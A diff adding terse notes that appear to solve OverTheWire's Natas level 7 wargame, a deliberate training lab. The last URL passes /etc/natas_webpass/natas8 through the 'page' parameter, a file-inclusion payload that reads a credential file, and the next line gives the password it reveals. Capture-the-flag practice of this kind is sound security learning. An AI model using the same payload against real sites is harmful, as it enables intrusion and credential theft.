@@ -1,0 +1,11 @@
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+
+http://natas7.natas.labs.overthewire.org/index.php?page=home
+this is the front page
+
+http://natas7.natas.labs.overthewire.org/index.php?page=about
+this is the about page
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
